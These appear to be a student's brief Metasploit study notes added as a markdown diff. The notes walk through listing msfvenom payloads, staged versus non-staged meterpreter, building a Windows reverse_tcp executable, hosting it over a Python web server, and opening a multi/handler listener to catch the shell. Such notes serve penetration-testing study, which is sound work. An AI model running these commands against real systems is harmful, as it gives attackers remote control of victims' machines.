@@ -1,0 +1,17 @@
+- msfvenom --list payload
+- staged vs non staged payload
+- windows/x64/meterpter/reverse_http
+- this is staged payload because you specify meterpter and then the protcol you want to use 
+- windows/x64/meterpter_reverse_http
+- this is non-staged payload because you specify meterpter as one payload
+- msfcenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT= 1234 -f exe > /home/kali/Desktop/Windowws_payloads/payloadx86.exe
+- then we can trasnfer this to target system 
+- msfvenom --list formats (get type extiontions ) 
+- sudo python -m SimpleHTTPServer 80 (so we can send our file to target system )
+- we need to open handler listner from our kali system 
+- msfconsole
+- use /multi/handler
+- set payload same payload as the same one to make our shell by msfvenom which is /windows/meterpter/reverse_tcp
+- set LHOST and LPORT | run
+- now the listener is ON!
+- we got to our target we fire up that payload
